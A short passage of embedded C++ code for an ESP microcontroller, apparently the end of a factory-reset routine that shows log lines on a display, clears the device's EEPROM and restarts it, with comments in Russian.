    "> [ OK ]",
    "> REBOOTING..."
  };

  for (int i = 0; i < 7; i++) {
    display.setCursor(0, i * 9);
    display.println(resetLogs[i]);
    display.display();
    delay(400 + random(200));
  }

  // Сама очистка
  for (int i = 0; i < 512; i++) EEPROM.write(i, 255);
  EEPROM.commit();

  delay(1000);
  ESP.restart();  // Перезагрузка системы
}